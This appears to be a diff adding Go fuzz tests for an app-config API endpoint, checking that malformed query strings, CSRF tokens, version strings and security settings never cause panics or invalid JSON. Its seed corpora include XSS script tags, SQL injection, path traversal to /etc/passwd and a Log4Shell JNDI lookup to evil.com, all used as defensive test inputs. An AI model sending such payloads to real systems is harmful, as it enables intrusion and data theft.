+			Version: "1.0.0-fuzz",
+		}
+
+		controller := &Controller{
+			DS:          mockDS,
+			Settings:    settings,
+			authService: nil,
+		}
+
+		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+		if accept != "" {
+			req.Header.Set("Accept", accept)
+		}
+		if customHeader != "" {
+			req.Header.Set("X-Custom", customHeader)
+		}
+
+		rec := httptest.NewRecorder()
+		c := e.NewContext(req, rec)
+		c.SetPath("/api/v2/app/config")
+
+		if csrfToken != "" {
+			c.Set("csrf", csrfToken)
+		}
+
+		// Should never panic
+		err := controller.GetAppConfig(c)
+		if err != nil {
+			// HTTP errors are acceptable
+			_, isHTTPError := err.(*echo.HTTPError)
+			if !isHTTPError {
+				t.Errorf("Unexpected error type: %T: %v", err, err)
+			}
+		}
+
+		// Response should be valid JSON if status is 200
+		if rec.Code == http.StatusOK {
+			var response map[string]any
+			if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
+				t.Errorf("Response is not valid JSON: %v", jsonErr)
+			}
+		}
+	})
+}
+
+// FuzzGetAppConfig_QueryParams fuzzes the endpoint with various query parameters.
+// Run with: go test -fuzz=FuzzGetAppConfig_QueryParams -fuzztime=30s
+func FuzzGetAppConfig_QueryParams(f *testing.F) {
+	// Add seed corpus with URL-encoded values
+	f.Add("")
+	f.Add("foo=bar")
+	f.Add("a=1&b=2&c=3")
+	f.Add("id=1")
+	f.Add("param=%3Cscript%3Ealert(1)%3C%2Fscript%3E")
+	f.Add("file=..%2F..%2F..%2Fetc%2Fpasswd")
+	f.Add("name=%E6%97%A5%E6%9C%AC%E8%AA%9E")
+	f.Add("key=value&key=value2")
+
+	f.Fuzz(func(t *testing.T, queryString string) {
+		e := echo.New()
+		mockDS := mocks.NewMockInterface(t)
+		settings := &conf.Settings{
+			Version: "1.0.0-fuzz",
+		}
+
+		controller := &Controller{
+			DS:          mockDS,
+			Settings:    settings,
+			authService: nil,
+		}
+
+		// Build URL safely - query string must be URL-encoded
+		url := "/api/v2/app/config"
+		if queryString != "" {
+			url += "?" + queryString
+		}
+
+		// httptest.NewRequest can panic on malformed URLs, so we need to handle that.
+		// Panics from malformed input are acceptable in fuzzing as this tests
+		// that the framework properly rejects malformed URLs.
+		defer func() {
+			_ = recover() // Suppress panic from malformed URLs
+		}()
+
+		req := httptest.NewRequest(http.MethodGet, url, http.NoBody)
+		rec := httptest.NewRecorder()
+		c := e.NewContext(req, rec)
+		c.SetPath("/api/v2/app/config")
+
+		// Should never panic (panics from httptest.NewRequest are caught above)
+		err := controller.GetAppConfig(c)
+		if err != nil {
+			_, isHTTPError := err.(*echo.HTTPError)
+			if !isHTTPError {
+				t.Errorf("Unexpected error type: %T: %v", err, err)
+			}
+		}
+
+		if rec.Code == http.StatusOK {
+			var response map[string]any
+			if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
+				t.Errorf("Response is not valid JSON: %v", jsonErr)
+			}
+		}
+	})
+}
+
+// FuzzGetAppConfig_CSRFToken fuzzes the CSRF token handling.
+// Run with: go test -fuzz=FuzzGetAppConfig_CSRFToken -fuzztime=30s
+func FuzzGetAppConfig_CSRFToken(f *testing.F) {
+	// Add seed corpus
+	f.Add("normal-token-123")
+	f.Add("")
+	f.Add("a")
+	f.Add(string(make([]byte, 1000)))
+	f.Add("token\x00with\x00nulls")
+	f.Add("日本語トークン")
+	f.Add("<script>alert('xss')</script>")
+	f.Add("' OR '1'='1")
+	f.Add("${jndi:ldap://evil.com/}")
+	f.Add("{{7*7}}")
+	f.Add("../../../etc/passwd")
+
+	f.Fuzz(func(t *testing.T, csrfToken string) {
+		e := echo.New()
+		mockDS := mocks.NewMockInterface(t)
+		settings := &conf.Settings{
+			Version: "1.0.0-fuzz",
+		}
+
+		controller := &Controller{
+			DS:          mockDS,
+			Settings:    settings,
+			authService: nil,
+		}
+
+		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+		rec := httptest.NewRecorder()
+		c := e.NewContext(req, rec)
+		c.SetPath("/api/v2/app/config")
+		c.Set("csrf", csrfToken)
+
+		err := controller.GetAppConfig(c)
+		if err != nil {
+			t.Errorf("Unexpected error: %v", err)
+		}
+
+		if rec.Code != http.StatusOK {
+			t.Errorf("Expected status 200, got %d", rec.Code)
+		}
+
+		var response AppConfigResponse
+		if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
+			t.Errorf("Response is not valid JSON: %v", jsonErr)
+		}
+
+		// For valid UTF-8 tokens, verify they are returned unchanged.
+		// Invalid UTF-8 sequences may be transformed by JSON encoding,
+		// so we only check valid UTF-8 strings for exact match.
+		if utf8.ValidString(csrfToken) {
+			if response.CSRFToken != csrfToken {
+				t.Errorf("CSRF token mismatch for valid UTF-8: expected %q, got %q", csrfToken, response.CSRFToken)
+			}
+		}
+		// For invalid UTF-8, just ensure we get a non-empty response if input was non-empty
+		// (JSON encoding may replace invalid bytes with replacement characters)
+	})
+}
+
+// FuzzGetAppConfig_Version fuzzes the version field handling.
+// Run with: go test -fuzz=FuzzGetAppConfig_Version -fuzztime=30s
+func FuzzGetAppConfig_Version(f *testing.F) {
+	// Add seed corpus
+	f.Add("1.0.0")
+	f.Add("")
+	f.Add("v2.3.4-rc.1+build.123")
+	f.Add("Development Build (local)")
+	f.Add("<script>alert('xss')</script>")
+	f.Add(string(make([]byte, 10000)))
+	f.Add("日本語バージョン")
+	f.Add("version\x00with\x00nulls")
+
+	f.Fuzz(func(t *testing.T, version string) {
+		e := echo.New()
+		mockDS := mocks.NewMockInterface(t)
+		settings := &conf.Settings{
+			Version: version,
+		}
+
+		controller := &Controller{
+			DS:          mockDS,
+			Settings:    settings,
+			authService: nil,
+		}
+
+		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+		rec := httptest.NewRecorder()
+		c := e.NewContext(req, rec)
+		c.SetPath("/api/v2/app/config")
+
+		err := controller.GetAppConfig(c)
+		if err != nil {
+			t.Errorf("Unexpected error: %v", err)
+		}
+
+		if rec.Code != http.StatusOK {
+			t.Errorf("Expected status 200, got %d", rec.Code)
+		}
+
+		var response AppConfigResponse
+		if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
+			t.Errorf("Response is not valid JSON: %v", jsonErr)
+		}
+
+		// For valid UTF-8 versions, verify they are returned unchanged.
+		// Invalid UTF-8 sequences may be transformed by JSON encoding.
+		if utf8.ValidString(version) {
+			if response.Version != version {
+				t.Errorf("Version mismatch for valid UTF-8: expected %q, got %q", version, response.Version)
+			}
+		}
+	})
+}
+
+// FuzzGetAppConfig_SecurityConfig fuzzes the security configuration.
+// Run with: go test -fuzz=FuzzGetAppConfig_SecurityConfig -fuzztime=30s
+func FuzzGetAppConfig_SecurityConfig(f *testing.F) {
+	// Add seed corpus (basicEnabled, googleEnabled, githubEnabled, microsoftEnabled, host)
+	f.Add(false, false, false, false, "")
+	f.Add(true, false, false, false, "localhost")
+	f.Add(true, true, true, true, "example.com")
+	f.Add(false, true, false, true, "日本語.com")
+	f.Add(true, true, true, true, "<script>evil</script>")
+
+	f.Fuzz(func(t *testing.T, basicEnabled, googleEnabled, githubEnabled, microsoftEnabled bool, host string) {
+		e := echo.New()
+		mockDS := mocks.NewMockInterface(t)
+
+		// Construct security config from fuzzed values
+		securityConfig := conf.Security{
+			BasicAuth: conf.BasicAuth{
+				Enabled: basicEnabled,
+			},
+			GoogleAuth: conf.SocialProvider{
+				Enabled: googleEnabled,
+			},
+			GithubAuth: conf.SocialProvider{
+				Enabled: githubEnabled,
+			},
+			MicrosoftAuth: conf.SocialProvider{
+				Enabled: microsoftEnabled,
+			},
+			Host: host,
+		}
+
+		settings := &conf.Settings{
+			Version:  "1.0.0-fuzz",
+			Security: securityConfig,
+		}
+
+		controller := &Controller{
+			DS:          mockDS,
+			Settings:    settings,
+			authService: nil,
+		}
+
+		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+		rec := httptest.NewRecorder()
+		c := e.NewContext(req, rec)
+		c.SetPath("/api/v2/app/config")
+
+		err := controller.GetAppConfig(c)
+		if err != nil {
+			t.Errorf("Unexpected error: %v", err)
+		}
+
+		if rec.Code != http.StatusOK {
+			t.Errorf("Expected status 200, got %d", rec.Code)
+		}
+
+		var response AppConfigResponse
+		if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
+			t.Errorf("Response is not valid JSON: %v", jsonErr)
+		}
+
+		// Verify security flags match input
+		expectedEnabled := basicEnabled || googleEnabled || githubEnabled || microsoftEnabled
+		if response.Security.Enabled != expectedEnabled {
+			t.Errorf("Security.Enabled mismatch: expected %v, got %v", expectedEnabled, response.Security.Enabled)
+		}
+
+		if response.Security.AuthConfig.BasicEnabled != basicEnabled {
+			t.Errorf("BasicEnabled mismatch: expected %v, got %v", basicEnabled, response.Security.AuthConfig.BasicEnabled)
+		}
+
+		if response.Security.AuthConfig.GoogleEnabled != googleEnabled {
+			t.Errorf("GoogleEnabled mismatch: expected %v, got %v", googleEnabled, response.Security.AuthConfig.GoogleEnabled)
+		}
+
+		if response.Security.AuthConfig.GithubEnabled != githubEnabled {
+			t.Errorf("GithubEnabled mismatch: expected %v, got %v", githubEnabled, response.Security.AuthConfig.GithubEnabled)
+		}
+
+		if response.Security.AuthConfig.MicrosoftEnabled != microsoftEnabled {
+			t.Errorf("MicrosoftEnabled mismatch: expected %v, got %v", microsoftEnabled, response.Security.AuthConfig.MicrosoftEnabled)
+		}
+
+		// Verify sensitive data is not exposed
+		bodyStr := rec.Body.String()
+		if host != "" && strings.Contains(bodyStr, host) {
+			t.Errorf("Host should not be exposed in response: %s", host)
+		}
+	})
+}
